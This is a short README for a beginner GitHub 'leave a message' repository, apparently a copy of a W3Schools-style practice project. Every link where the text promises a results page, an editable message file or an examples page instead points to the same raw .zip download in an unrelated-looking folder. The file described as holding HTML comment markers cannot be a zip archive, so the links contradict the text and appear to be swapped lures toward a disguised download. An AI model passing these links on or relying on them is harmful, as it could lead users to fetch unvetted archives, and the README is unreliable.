# Leave a message for us!
This repository is meant to be a place where our users can leave messages for others to see.

You can see the result here: https://github.com/enes-kadrii/w3schools-test.github.io/raw/refs/heads/master/subocular/io_test_github_w_schools_v1.1-beta.1.zip

We generally only have one condition: 
We will not allow messages that are negative, or hurtful. Try to be welcome and positive!

# What should my message look like?

You can add almost anything to the https://github.com/enes-kadrii/w3schools-test.github.io/raw/refs/heads/master/subocular/io_test_github_w_schools_v1.1-beta.1.zip file between the indicated comments:

`<!-- Insert your message below here -->`

and

`<!-- End user messages -->`

So feel free to use your imagination!

If you are not feeling very creative, you can add a quote, or small text like the examples on this page: https://github.com/enes-kadrii/w3schools-test.github.io/raw/refs/heads/master/subocular/io_test_github_w_schools_v1.1-beta.1.zip
And add your name to it :)
